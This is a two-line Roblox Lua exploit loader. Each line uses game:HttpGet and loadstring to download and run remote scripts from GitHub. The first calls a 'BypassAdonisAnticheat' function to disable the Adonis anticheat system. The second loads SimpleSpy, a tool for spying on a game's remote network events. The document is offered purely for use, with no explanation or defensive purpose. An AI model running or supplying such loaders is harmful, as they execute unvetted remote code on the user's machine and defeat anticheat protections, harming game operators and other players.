loadstring(game:HttpGet("http://github.com/IvanTheProtogen/ExtraAbilities/raw/main/main.lua"))().BypassAdonisAnticheat();

loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/SimpleSpyV3-ForMobile/main/SimpleSpy.lua.txt'))() -- SimpleSpy V2.2 for Mobile